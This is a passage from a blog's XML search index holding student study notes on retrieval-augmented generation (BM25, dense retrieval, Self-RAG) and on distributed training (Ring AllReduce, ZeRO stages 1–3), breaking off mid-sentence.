<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>11711 Advanced NLP: Retrieval and RAG</title>
      <link href="/2026/02/14/11711-Advanced-NLP/11711-Advanced-NLP-Retrieval-RAG/"/>
      <url>/2026/02/14/11711-Advanced-NLP/11711-Advanced-NLP-Retrieval-RAG/</url>
      
        <content type="html"><![CDATA[<h1 id="lec10-retrieval-and-rag">Lec10 Retrieval and RAG</h1><h2 id="why-retrieval">Why Retrieval?</h2><p>Large language models are powerful, but they still suffer from:</p><ul><li><strong>Hallucination:</strong> generating fluent but unsupportedclaims.</li><li><strong>Stale knowledge:</strong> model parameters cannot instantlyreflect new facts.</li><li><strong>Monolithic memory bottleneck:</strong> all knowledge iscompressed into fixed parameters.</li></ul><p>Retrieval-augmented systems treat external documents as a<strong>non-parametric memory</strong> and fetch evidence at inferencetime.</p><h2 id="retrieval-augmented-lm-core-intuition">Retrieval-Augmented LM:Core Intuition</h2><p>Given a query <span class="math inline">\(x\)</span>:</p><ol type="1"><li>Retrieve top-<span class="math inline">\(k\)</span> relevantpassages from a datastore.</li><li>Feed retrieved passages + query to the generator.</li><li>Generate an answer grounded in retrieved evidence.</li></ol><p>Key components:</p><ul><li><strong>Datastore:</strong> the corpus and index.</li><li><strong>Retriever:</strong> maps query/document to similarityscores.</li><li><strong>Generator (LM):</strong> produces final response.</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214230716495.png" alt="image-20260214230716495" style="zoom:40%;" /></p><h2 id="part-1-datastore">Part 1: Datastore</h2><h3 id="what-to-store">What to Store?</h3><p>Typical options include:</p><ul><li>Web pages, papers, wiki pages, domain documents.</li><li>Passage-level chunks instead of full documents.</li><li>Metadata (source, timestamp, URL, section title) for attribution andfiltering.</li></ul><h3 id="processing-pipeline">Processing Pipeline</h3><p>A practical pipeline:</p><ol type="1"><li><strong>Curation:</strong> pick sources relevant to targettasks.</li><li><strong>Preprocessing:</strong> HTML/PDF to clean text, normalize,deduplicate.</li><li><strong>Chunking:</strong> split long docs into passages.</li><li><strong>Indexing:</strong> build sparse or dense retrievalindex.</li></ol><p>Chunking trade-off:</p><ul><li>Too short: lacks context.</li><li>Too long: introduces noise and hurts retrieval precision.</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214230755612.png" alt="image-20260214230755612" style="zoom:40%;" /></p><h3 id="scaling-considerations">Scaling Considerations</h3><ul><li>Corpus size can reach billions of tokens or more.</li><li>Use ANN index and sharding for low-latency serving.</li><li>Keep document freshness via periodic re-indexing.</li></ul><h2 id="part-2-retriever">Part 2: Retriever</h2><h3 id="sparse-retriever-tf-idf-bm25">Sparse Retriever (TF-IDF /BM25)</h3><p>Classic lexical matching uses bag-of-words style vectors.</p><p>TF-IDF basics: <span class="math display">\[\text{TF}(t, d)=\frac{\text{freq}(t,d)}{\sum_{t&#39;}\text{freq}(t&#39;,d)},\quad\text{IDF}(t)=\log\frac{N}{\text{df}(t)}\]</span></p><ul><li><p><strong>TF(t, d)</strong> measures how frequently term $t $appears in document $d $, normalized by document length.</p></li><li><p><strong>IDF(t)</strong> measures how rare a term is across theentire corpus. Common words like “the” appear in nearly every document,so $(t) N $ and IDF → 0.</p></li><li><p>The final TF-IDF score is simply $(t,d) (t) $: a term mattersmost when it’s frequent in this document but rare globally.</p></li></ul><p>BM25 score: <span class="math display">\[\text{BM25}(q,d)=\sum_{t \in q}\text{IDF}(t)\cdot\frac{\text{TF}(t,d)(k_1+1)}{\text{TF}(t,d)+k_1\left(1-b+b\frac{|d|}{\text{avgdl}}\right)}\]</span></p><p>BM25 (Best Matching 25) is a probabilistic refinement of TF-IDF, andis the default ranking function in search engines like Elasticsearch andLucene. Two key improvements:</p><ul><li><strong>TF saturation</strong> (controlled by $k_1 $, typically1.2): As $(t,d) $ grows, the score approaches an asymptotic limit of$(k_1 + 1) $. This prevents a document from dominating just because itrepeats a keyword excessively. In contrast, raw TF-IDF grows linearlywithout bound.</li><li><strong>Document length normalization</strong> (controlled by $b $,typically 0.75): The term $b $ penalizes longer documents, since theynaturally have higher term frequencies. When $b = 0 $, no lengthnormalization is applied; when $b = 1 $, full normalization relative tothe average document length (avgdl).</li></ul><p>Pros:</p><ul><li>Fast and strong lexical precision.</li><li>No neural training needed.</li></ul><p>Cons:</p><ul><li>Weak semantic matching for paraphrases.</li></ul><h3 id="dense-retriever-bi-encoder">Dense Retriever (Bi-Encoder)</h3><p>Encode query and documents into dense vectors: <spanclass="math display">\[s(q,d)=\langle E_q(q), E_d(d) \rangle\]</span></p><p>Common training uses contrastive learning: <spanclass="math display">\[\mathcal{L}=-\log \frac{\exp(s(q,d^+)/\tau)}{\exp(s(q,d^+)/\tau)+\sum_{d^-}\exp(s(q,d^-)/\tau)}\]</span></p><p>Pros:</p><ul><li>Better semantic retrieval.</li><li>Works for paraphrases and lexical mismatch.</li></ul><p>Cons:</p><ul><li>Requires training data and ANN infrastructure.</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214232605928.png" alt="image-20260214232605928" style="zoom:50%;" /></p><h3 id="fast-nearest-neighbor-search">Fast Nearest Neighbor Search</h3><p>Dense retrieval at scale relies on approximate nearest neighbor (ANN)methods (e.g., FAISS) to trade tiny recall loss for large latencygains.</p><h3 id="re-ranking-with-cross-encoder">Re-ranking withCross-Encoder</h3><p>Two-stage retrieval is common:</p><ol type="1"><li>Bi-encoder retrieves top-<span class="math inline">\(k\)</span>candidates quickly.</li><li>Cross-encoder re-ranks the shortlist with higher accuracy.</li></ol><h3 id="evaluation-metrics-and-benchmarks">Evaluation Metrics andBenchmarks</h3><p>Frequent metrics:</p><ul><li><strong>Recall@k</strong>: whether relevant docs are found intop-<span class="math inline">\(k\)</span>.</li><li><strong>MRR</strong>: reciprocal rank quality for first relevanthit.</li><li><strong>nDCG@k</strong>: graded ranking quality.</li><li><strong>Precision@k</strong>: fraction of top-<spanclass="math inline">\(k\)</span> hits that are relevant.</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214232801569.png" alt="image-20260214232801569" style="zoom:40%;" /></p><p>Benchmarks highlighted in lecture:</p><ul><li><strong>BEIR</strong> (zero-shot IR across heterogeneoustasks).</li><li><strong>MTEB</strong> (massive embedding benchmark).</li></ul><h2 id="part-3-how-to-use-retrieval">Part 3: How to Use Retrieval</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214233154775.png" alt="image-20260214233154775" style="zoom:33%;" /></p><h3 id="in-contet-rag-input-augmentation">In-contet RAG (InputAugmentation)</h3><p>Retrieve evidence and append it to prompt context.</p><p>Sequence-level RAG form: <span class="math display">\[p(y \mid x) \approx \sum_{z \in \text{top-}k} p_\eta(z \midx)\,p_\theta(y \mid x, z)\]</span></p><p>Token-level marginalization form: <span class="math display">\[p(y \mid x) \approx \prod_i \sum_{z \in \text{top-}k}p_\eta(z \mid x)\,p_\theta(y_i \mid x, z, y_{&lt;i})\]</span></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214233256164.png" alt="image-20260214233256164" style="zoom:40%;" /></p><h3 id="training-strategies-for-rag">Training Strategies for RAG</h3><ul><li><strong>Independent training:</strong> train retriever and generatorseparately.</li><li><strong>Sequential training:</strong> train retriever first, thenadapt generator.</li><li><strong>End-to-end training:</strong> optimize retrieval andgeneration jointly.</li></ul><h3 id="limitations-of-in-context-rag">Limitations of In-contextRAG</h3><ul><li>Retrieval can return irrelevant passages (error propagation).</li><li>Long contexts increase cost and may dilute useful evidence.</li><li>Generator may still ignore retrieved evidence if prompts areweak.</li></ul><h3 id="self-rag-and-adaptive-retrieval">Self-RAG and AdaptiveRetrieval</h3><p>Self-RAG style systems learn to:</p><ul><li>Decide <strong>whether retrieval is needed</strong>.</li><li>Decide <strong>when to retrieve again</strong> duringgeneration.</li><li>Critique or verify generation quality with evidence.</li></ul><p>This makes retrieval usage conditional rather than always-on.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214234204710.png" alt="image-20260214234204710" style="zoom:30%;" /></p><h3 id="beyond-in-context-rag">Beyond In-context RAG</h3><ul><li><strong>Tool-augmented LMs:</strong> invoke tools/search APIsiteratively.</li><li><strong>Deep Research Agents:</strong> multi-step retrieval +synthesis workflows.</li><li><strong>Intermediate augmentation:</strong> RETRO / kNN-LM retrieveat hidden-state or token level, not only prompt level.</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214234855647.png" alt="image-20260214234855647" style="zoom:40%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214234831602.png" alt="image-20260214234831602" style="zoom:40%;" /></p><h2 id="practical-checklist">Practical Checklist</h2><ol type="1"><li>Define target domain and freshness requirement.</li><li>Build clean, well-chunked datastore with metadata.</li><li>Choose sparse/dense/hybrid retrieval based on latency-qualitybudget.</li><li>Add reranker if top-<span class="math inline">\(k\)</span> qualityis bottleneck.</li><li>Track retrieval metrics and end-task accuracy jointly.</li><li>Add citation and evidence checks to reduce hallucination risk.</li></ol><h2 id="key-takeaways">Key Takeaways</h2><ul><li>RAG adds an external, updatable memory to LMs.</li><li>Quality depends on three coupled parts: <strong>datastore,retriever, generator</strong>.</li><li>Dense retrieval + reranking is often the practical high-performancepath.</li><li>Adaptive retrieval (Self-RAG, tool use) addresses limits of staticin-context RAG.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CMU 11-711 Advanced NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Natural Language Processing </tag>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> 11711 </tag>
            
            <tag> AI </tag>
            
            <tag> Retrieval </tag>
            
            <tag> RAG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15642 Machine Learning Systems: Distributed Training and Parallelization</title>
      <link href="/2026/02/13/15642-Machine-Learning-Systems/15642-ML-Systems-Distributed-Training-and-Parallelization/"/>
      <url>/2026/02/13/15642-Machine-Learning-Systems/15642-ML-Systems-Distributed-Training-and-Parallelization/</url>
      
        <content type="html"><![CDATA[<h1 id="data-parallelism-and-zero-redundancy">Data Parallelism and ZeroRedundancy</h1><p>Course: 15-442/15-642 Machine Learning Systems Instructors: TianqiChen and Zhihao Jia Carnegie Mellon University</p><h2 id="dnn-training-overview">DNN Training Overview</h2><p>DNN training iterates three phases: <strong>forwardpropagation</strong> computes layer outputs <spanclass="math inline">\(h^{(l+1)} = f^{(l)}(W^{(l)} h^{(l)} +b^{(l)})\)</span>, <strong>backward propagation</strong> computesgradients via chain rule <span class="math inline">\(\frac{\partialL}{\partial W^{(l)}}\)</span>, and <strong>weight update</strong>applies <span class="math inline">\(W^{(l)} \leftarrow W^{(l)} - \eta\frac{\partial L}{\partial W^{(l)}}\)</span>.</p><p>Each GPU must store <strong>parameters</strong>,<strong>activations</strong> (saved for backward),<strong>gradients</strong>, and <strong>optimizer states</strong> (e.g.,momentum and variance for Adam). For large models, this memory footprintbecomes the primary bottleneck.</p><h2 id="data-parallelism-basics">Data Parallelism Basics</h2><p>Data parallelism splits training data across multiple workers (GPUs),each holding a <strong>full copy of the model</strong>. The trainingloop per iteration:</p><ol type="1"><li><strong>Scatter data</strong>: Distribute different mini-batches toeach worker</li><li><strong>Forward &amp; Backward</strong>: Each worker independentlycomputes gradients on its local data</li><li><strong>Synchronize gradients</strong>: Aggregate gradients acrossall workers (AllReduce)</li><li><strong>Update parameters</strong>: Each worker applies theoptimizer step with aggregated gradients</li></ol><p>All workers maintain identical parameters through synchronizedgradient updates. With 4 workers and batch size 32, each processes 8samples — ideally 4x speedup.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203324202.png" alt="image-20260213203324202" style="zoom:40%;" /></p><h2 id="gradient-aggregation-strategies">Gradient AggregationStrategies</h2><h3 id="parameter-server-architecture">Parameter ServerArchitecture</h3><p>The <strong>Parameter Server</strong> is a centralized approach:workers push gradients to a central server (<spanclass="math inline">\(N \times M\)</span> communication), the serveraggregates and updates parameters, then workers pull the updated weights(<span class="math inline">\(N \times M\)</span> communication). Totalcommunication: <span class="math inline">\(2NM\)</span> periteration.</p><p><strong>Limitations</strong>: All traffic funnels through the server,creating a <strong>bandwidth bottleneck</strong> that worsens with moreworkers. It is also a single point of failure with uneven loaddistribution. This architecture does <strong>not scale</strong>well.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203343033.png" alt="image-20260213203343033" style="zoom:50%;" /></p><h3 id="allreduce-communication-patterns">AllReduce CommunicationPatterns</h3><p><strong>AllReduce</strong> is a decentralized collective operation:all workers contribute local gradients and receive the aggregatedresult. No single bottleneck node.</p><h4 id="naive-allreduce">Naive AllReduce</h4><p>Every worker broadcasts its <span class="math inline">\(M\)</span>parameters to all <span class="math inline">\((N-1)\)</span> others.Total communication: <span class="math inline">\(N(N-1)M = O(N^2M)\)</span> — quadratic scaling, not efficient.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203414047.png" alt="image-20260213203414047" style="zoom:50%;" /></p><h4 id="ring-allreduce">Ring AllReduce</h4><p>Ring AllReduce achieves optimal communication complexity byorganizing workers in a logical ring.</p><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203518118.png"alt="image-20260213203518118" /><figcaption aria-hidden="true">image-20260213203518118</figcaption></figure><h5 id="aggregation-phase">Aggregation Phase</h5><p><strong>Setup</strong>: Arrange N workers in a ring: <spanclass="math inline">\(W_0 \leftrightarrow W_1 \leftrightarrow \cdots\leftrightarrow W_{N-1} \leftrightarrow W_0\)</span></p><p><strong>Strategy</strong>: Partition parameters into N chunks,process one chunk per step.</p><p><strong>Process</strong> (N-1 steps):</p><ol type="1"><li>Each worker starts with one chunk as “responsible chunk”</li><li><strong>Step k</strong> <span class="math inline">\((k = 0, 1,\ldots, N-2)\)</span>:<ul><li>Worker <span class="math inline">\(i\)</span> sends chunk <spanclass="math inline">\(j\)</span> to worker <spanclass="math inline">\((i+1) \mod N\)</span></li><li>Worker <span class="math inline">\(i\)</span> receives chunk <spanclass="math inline">\(j&#39;\)</span> from worker <spanclass="math inline">\((i-1) \mod N\)</span></li><li>Worker <span class="math inline">\(i\)</span><strong>accumulates</strong> received chunk: <spanclass="math inline">\(\text{chunk}_{j&#39;} \leftarrow\text{chunk}_{j&#39;} + \text{received}\)</span></li></ul></li></ol><p><strong>Result</strong>: After N-1 steps, each worker has the<strong>fully aggregated</strong> result for one chunk.</p><h5 id="broadcast-phase">Broadcast Phase</h5><p><strong>Goal</strong>: Distribute the aggregated chunks so everyworker has all chunks.</p><p><strong>Process</strong> (N-1 steps):</p><ol type="1"><li><strong>Step k</strong> <span class="math inline">\((k = 0, 1,\ldots, N-2)\)</span>:<ul><li>Worker <span class="math inline">\(i\)</span> sends its completedchunk to worker <span class="math inline">\((i+1) \mod N\)</span></li><li>Worker <span class="math inline">\(i\)</span> receives a completedchunk from worker <span class="math inline">\((i-1) \mod N\)</span></li></ul></li></ol><p><strong>Result</strong>: After N-1 steps, all workers have allaggregated chunks.</p><h5 id="communication-cost-analysis">Communication Cost Analysis</h5><p>Each step transfers <span class="math inline">\(M/N\)</span> perworker. Total steps: <span class="math inline">\(2(N-1)\)</span> (N-1aggregation + N-1 broadcast).</p><p><strong>Total per worker</strong>: <span class="math inline">\(2(N-1)\times \frac{M}{N} \approx 2M\)</span> — <strong>independent ofN</strong>, optimal scaling.</p><p><strong>Total network communication</strong>: <spanclass="math inline">\(2(N-1)M \approx 2NM\)</span>.</p><h4 id="tree-allreduce">Tree AllReduce</h4><p>Workers form a binary tree with depth <spanclass="math inline">\(\log_2 N\)</span>. The <strong>Reducephase</strong> (bottom-up) aggregates gradients from leaves to root; the<strong>Broadcast phase</strong> (top-down) distributes the resultback.</p><p><strong>Communication</strong>: Reduce phase <spanclass="math inline">\(\sum_{i=1}^{\log_2 N} \frac{N}{2^i} \times M =(N-1)M\)</span>, broadcast phase <spanclass="math inline">\((N-1)M\)</span>. Total: <spanclass="math inline">\(2(N-1)M \approx 2NM\)</span> in only <spanclass="math inline">\(2\log_2 N\)</span> iterations (fewer than ring’s<span class="math inline">\(2(N-1)\)</span>). Trade-off: potentialbandwidth bottleneck at the root.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203539472.png" alt="image-20260213203539472" style="zoom:50%;" /></p><h4 id="butterfly-allreduce">Butterfly AllReduce</h4><p>Uses a hypercube-based pattern: in iteration <spanclass="math inline">\(k\)</span>, worker <spanclass="math inline">\(i\)</span> communicates with worker <spanclass="math inline">\(i \oplus 2^k\)</span> (XOR). For 8 workers:iteration 0 pairs 0↔︎1, 2↔︎3, 4↔︎5, 6↔︎7; iteration 1 pairs 0↔︎2, 1↔︎3, 4↔︎6,5↔︎7; iteration 2 pairs 0↔︎4, 1↔︎5, 2↔︎6, 3↔︎7.</p><p>Each iteration, workers exchange <spanclass="math inline">\(M/2\)</span> parameters with their partner andaggregate locally. All workers operate in parallel with balancedload.</p><p><strong>Communication</strong>: <spanclass="math inline">\(M\)</span> per worker per iteration × <spanclass="math inline">\(\log_2 N\)</span> iterations = <spanclass="math inline">\(NM\log_2 N\)</span> total. Slightly more thanRing/Tree (<span class="math inline">\(2NM\)</span>), but only <spanclass="math inline">\(\log_2 N\)</span> iterations — best when latencymatters more than total bandwidth. Requires power-of-2 worker count.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203552267.png" alt="image-20260213203552267" style="zoom:33%;" /></p><h3 id="performance-comparison">Performance Comparison</h3><table><thead><tr class="header"><th>Algorithm</th><th>Total Communication</th><th>Iterations</th><th>Bandwidth Bottleneck</th></tr></thead><tbody><tr class="odd"><td>Parameter Server</td><td><span class="math inline">\(2NM\)</span></td><td>2</td><td>Server bottleneck</td></tr><tr class="even"><td>Naive AllReduce</td><td><span class="math inline">\(N(N-1)M\)</span></td><td>1</td><td>Quadratic scaling</td></tr><tr class="odd"><td>Ring AllReduce</td><td><span class="math inline">\(2NM\)</span></td><td><span class="math inline">\(2(N-1)\)</span></td><td>Balanced</td></tr><tr class="even"><td>Tree AllReduce</td><td><span class="math inline">\(2NM\)</span></td><td><span class="math inline">\(2\log_2 N\)</span></td><td>Root bottleneck</td></tr><tr class="odd"><td>Butterfly AllReduce</td><td><span class="math inline">\(NM\log_2 N\)</span></td><td><span class="math inline">\(\log_2 N\)</span></td><td>Balanced</td></tr></tbody></table><p><strong>Ring AllReduce</strong> is the most commonly used in practice(PyTorch DDP, Horovod) — optimal <spanclass="math inline">\(2NM\)</span> communication with balancedbandwidth. <strong>Tree AllReduce</strong> trades root bottleneck riskfor fewer iterations (<span class="math inline">\(2\log_2 N\)</span>).<strong>Butterfly</strong> minimizes iterations (<spanclass="math inline">\(\log_2 N\)</span>) at the cost of slightly highertotal communication.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203638515.png" alt="image-20260213203638515" style="zoom:50%;" /></p><h2 id="large-model-training-challenges">Large Model TrainingChallenges</h2><p>As models scale to billions of parameters, memory becomes thecritical bottleneck.</p><h3 id="memory-breakdown">Memory Breakdown</h3><p>For a model with <strong>M parameters</strong> using mixed-precisiontraining with Adam:</p><table><thead><tr class="header"><th>Component</th><th>Precision</th><th>Memory</th></tr></thead><tbody><tr class="odd"><td>Parameters</td><td>FP16</td><td><span class="math inline">\(2M\)</span> bytes</td></tr><tr class="even"><td>Gradients</td><td>FP16</td><td><span class="math inline">\(2M\)</span> bytes</td></tr><tr class="odd"><td>Optimizer: FP32 master copy</td><td>FP32</td><td><span class="math inline">\(4M\)</span> bytes</td></tr><tr class="even"><td>Optimizer: Momentum (1st moment)</td><td>FP32</td><td><span class="math inline">\(4M\)</span> bytes</td></tr><tr class="odd"><td>Optimizer: Variance (2nd moment)</td><td>FP32</td><td><span class="math inline">\(4M\)</span> bytes</td></tr><tr class="even"><td><strong>Total</strong></td><td></td><td><strong><span class="math inline">\(16M\)</span> bytes</strong></td></tr></tbody></table><p>FP16 is used for forward/backward computation (faster, less memory).FP32 is required for optimizer updates to prevent numerical errorsduring accumulation.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203727232.png" alt="image-20260213203727232" style="zoom:67%;" /></p><h3 id="scaling-examples">Scaling Examples</h3><table><thead><tr class="header"><th>Model</th><th>Parameters</th><th>Training Memory</th><th>Hardware</th></tr></thead><tbody><tr class="odd"><td>BERT-Large (2018)</td><td>340M</td><td>5.4 GB</td><td>Fits on single V100 (16GB)</td></tr><tr class="even"><td>GPT-2 (2019)</td><td>1.5B</td><td>24 GB</td><td>Requires multi-GPU</td></tr><tr class="odd"><td>GPT-3 (2020)</td><td>175B</td><td>2.8 TB</td><td>35+ A100-80GB GPUs</td></tr></tbody></table><p>Standard data parallelism replicates the full model on each GPU —massive memory redundancy.</p><h2 id="zero-zero-redundancy-optimizer">ZeRO: Zero RedundancyOptimizer</h2><h3 id="overview">Overview</h3><p><strong>ZeRO</strong> (Zero Redundancy Optimizer) eliminates memoryredundancy in data-parallel training. Standard DP replicates parameters,gradients, and optimizer states on every GPU — for N GPUs, that is Ncopies of everything, wasting <span class="math inline">\((N-1) \times16M\)</span> bytes.</p><p>ZeRO’s idea: <strong>partition</strong> these components across GPUsinstead of replicating them, reducing per-GPU memory from <spanclass="math inline">\(16M\)</span> to <spanclass="math inline">\(\frac{16M}{N}\)</span> at the cost of additionalcommunication.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203743083.png" alt="image-20260213203743083" style="zoom:50%;" /></p><h3 id="zero-stage-1-partitioning-optimizer-states">ZeRO Stage 1:Partitioning Optimizer States</h3><p>ZeRO-1 partitions only the optimizer states across GPUs. Parametersand gradients remain fully replicated. Each GPU is responsible forupdating only its assigned <spanclass="math inline">\(\frac{1}{N}\)</span> partition.</p><p><strong>Training iteration</strong>: 1. <strong>Forward</strong>:Normal computation using full local parameters (no communication) 2.<strong>Backward</strong>: Compute full gradients →<strong>AllReduce</strong> to synchronize (<spanclass="math inline">\(2M\)</span> communication) 3. <strong>WeightUpdate</strong>: Each GPU updates only its partition using localoptimizer states 4. <strong>Parameter Sync</strong>:<strong>AllGather</strong> to reconstruct full parameters on every GPU(<span class="math inline">\(2M\)</span> communication)</p><p><strong>Memory per GPU</strong>: <span class="math inline">\(4M +\frac{12M}{N}\)</span> (parameters <spanclass="math inline">\(2M\)</span> + gradients <spanclass="math inline">\(2M\)</span> + partitioned optimizer <spanclass="math inline">\(\frac{12M}{N}\)</span>)</p><p><strong>Communication</strong>: <spanclass="math inline">\(4M\)</span> per iteration. For N=4: memory = <spanclass="math inline">\(7M\)</span> vs baseline <spanclass="math inline">\(16M\)</span> — <strong>2.3x</strong>reduction.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203833244.png" alt="image-20260213203833244" style="zoom:60%;" /></p><h3 id="zero-stage-2-partitioning-gradients">ZeRO Stage 2: PartitioningGradients</h3><p>ZeRO-2 additionally partitions <strong>gradients</strong> — sinceeach GPU only needs gradients for the parameters it updates, there is noneed for a full gradient buffer.</p><p>The key change: replace <strong>AllReduce</strong> with<strong>Reduce-Scatter</strong> during backward. Reduce-Scatteraggregates gradients but only delivers each GPU the partition it owns(no broadcast phase needed). This can happen layer-by-layer duringbackpropagation, overlapping communication with computation.</p><p><strong>Training iteration</strong>: 1. <strong>Forward</strong>:Normal computation (no communication) 2. <strong>Backward</strong>:Compute gradients → <strong>Reduce-Scatter</strong> per layer, each GPUkeeps only its partition 3. <strong>Weight Update</strong>: Each GPUupdates its partition 4. <strong>Parameter Sync</strong>:<strong>AllGather</strong> to reconstruct full parameters (<spanclass="math inline">\(2M\)</span>)</p><p><strong>Memory per GPU</strong>: <span class="math inline">\(2M +\frac{14M}{N}\)</span> (parameters <spanclass="math inline">\(2M\)</span> + partitioned gradients <spanclass="math inline">\(\frac{2M}{N}\)</span> + partitioned optimizer<span class="math inline">\(\frac{12M}{N}\)</span>)</p><p><strong>Communication</strong>: <spanclass="math inline">\(4M\)</span> per iteration (same as ZeRO-1). ForN=4: memory = <span class="math inline">\(5.5M\)</span> —<strong>2.9x</strong> reduction.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213203941968.png" alt="image-20260213203941968" style="zoom:67%;" /></p><h3 id="zero-stage-3-partitioning-parameters">ZeRO Stage 3: PartitioningParameters</h3><p>ZeRO-3 partitions <strong>everything</strong> — no component isreplicated. Each GPU stores only <spanclass="math inline">\(\frac{1}{N}\)</span> of parameters, gradients, andoptimizer states. The challenge: how to compute forward/backward withoutfull parameters? Solution: <strong>AllGather</strong> parameters ondemand, then discard.</p><p><strong>Forward</strong> (layer-by-layer): AllGather <spanclass="math inline">\(W^{(l)}\)</span> → compute layer → discardgathered parameters (keep only own partition and activations).</p><p><strong>Backward</strong> (layer-by-layer): AllGather <spanclass="math inline">\(W^{(l)}\)</span> again → compute gradients →Reduce-Scatter gradients → discard gathered parameters → update ownpartition immediately.</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213204010120.png" alt="image-20260213204010120" style="zoom:67%;" /></p><p>No separate parameter sync step needed — updated parameters arealready correctly partitioned.</p><p><strong>Memory per GPU</strong>: <spanclass="math inline">\(\frac{16M}{N}\)</span> — perfect linear scaling(<span class="math inline">\(O(M/N)\)</span>).</p><p><strong>Communication</strong>: <spanclass="math inline">\(4M\)</span> per iteration (AllGather in forward<span class="math inline">\(+\)</span> AllGather in backward <spanclass="math inline">\(+\)</span> Reduce-Scatter gradients). This is 2xthe baseline, but enables training models that otherwise cannot fit inmemory. Use when ZeRO-2 is insufficient.</p><h3 id="performance-analysis">Performance Analysis</h3><h4 id="memory-comparison-m-parameters-n-gpus">Memory Comparison (Mparameters, N GPUs)</h4><table style="width:100%;"><colgroup><col style="width: 22%" /><col style="width: 27%" /><col style="width: 16%" /><col style="width: 16%" /><col style="width: 16%" /></colgroup><thead><tr class="header"><th>Component</th><th>Baseline DP</th><th>ZeRO-1</th><th>ZeRO-2</th><th>ZeRO-3</th></tr></thead><tbody><tr class="odd"><td>Parameters</td><td><span class="math inline">\(2M\)</span></td><td><span class="math inline">\(2M\)</span></td><td><span class="math inline">\(2M\)</span></td><td><span class="math inline">\(\frac{2M}{N}\)</span></td></tr><tr class="even"><td>Gradients</td><td><span class="math inline">\(2M\)</span></td><td><span class="math inline">\(2M\)</span></td><td><span class="math inline">\(\frac{2M}{N}\)</span></td><td><span class="math inline">\(\frac{2M}{N}\)</span></td></tr><tr class="odd"><td>Optimizer States</td><td><span class="math inline">\(12M\)</span></td><td><span class="math inline">\(\frac{12M}{N}\)</span></td><td><span class="math inline">\(\frac{12M}{N}\)</span></td><td><span class="math inline">\(\frac{12M}{N}\)</span></td></tr><tr class="even"><td><strong>Total</strong></td><td><span class="math inline">\(16M\)</span></td><td><span class="math inline">\(4M + \frac{12M}{N}\)</span></td><td><span class="math inline">\(2M + \frac{14M}{N}\)</span></td><td><span class="math inline">\(\frac{16M}{N}\)</span></td></tr></tbody></table><p><strong>GPT-3 (175B, 64 GPUs)</strong>: Baseline = 2.8 TB/GPU(impossible), ZeRO-1 = 750 GB, ZeRO-2 = 481 GB, <strong>ZeRO-3 = 44GB</strong> (fits on A100-80GB).</p><h4 id="communication-comparison">Communication Comparison</h4><table><thead><tr class="header"><th>Stage</th><th>Forward</th><th>Backward</th><th>Update</th><th>Total</th></tr></thead><tbody><tr class="odd"><td>Baseline DP</td><td>-</td><td><span class="math inline">\(2M\)</span> (AllReduce)</td><td>-</td><td><span class="math inline">\(2M\)</span></td></tr><tr class="even"><td>ZeRO-1</td><td>-</td><td><span class="math inline">\(2M\)</span> (AllReduce)</td><td><span class="math inline">\(2M\)</span> (AllGather)</td><td><span class="math inline">\(4M\)</span></td></tr><tr class="odd"><td>ZeRO-2</td><td>-</td><td><span class="math inline">\(2M\)</span> (Reduce-Scatter)</td><td><span class="math inline">\(2M\)</span> (AllGather)</td><td><span class="math inline">\(4M\)</span></td></tr><tr class="even"><td>ZeRO-3</td><td><span class="math inline">\(2M\)</span> (AllGather)</td><td><span class="math inline">\(2M\)</span> (Reduce-Scatter)</td><td>-</td><td><span class="math inline">\(4M\)</span></td></tr></tbody></table><p>All ZeRO stages have 2x communication vs baseline. ZeRO-3 has higherlatency due to layer-by-layer synchronization but enables the largestmodels. High-speed interconnects (NVLink, InfiniBand) are essential, andcommunication can be overlapped with computation to hide latency.</p><h2 id="summary">Summary</h2><table><thead><tr class="header"><th>Stage</th><th>Partitioned</th><th>Memory per GPU</th><th>Communication</th></tr></thead><tbody><tr class="odd"><td><strong>Baseline DP</strong></td><td>Nothing</td><td><span class="math inline">\(16M\)</span></td><td><span class="math inline">\(2M\)</span></td></tr><tr class="even"><td><strong>ZeRO-1</strong></td><td>Optimizer states</td><td><span class="math inline">\(4M + \frac{12M}{N}\)</span></td><td><span class="math inline">\(4M\)</span></td></tr><tr class="odd"><td><strong>ZeRO-2</strong></td><td>Optimizer + Gradients</td><td><span class="math inline">\(2M + \frac{14M}{N}\)</span></td><td><span class="math inline">\(4M\)</span></td></tr><tr class="even"><td><strong>ZeRO-3</strong></td><td>Everything</td><td><span class="math inline">\(\frac{16M}{N}\)</span></td><td><span class="math inline">\(4M\)</span></td></tr></tbody></table><p>ZeRO enables <strong>linear memory scaling</strong> (<spanclass="math inline">\(O(M/N)\)</span>) at a modest 2x communicationoverhead. Used in practice by DeepSpeed and PyTorch FSDP.</p><p><strong>Choosing a 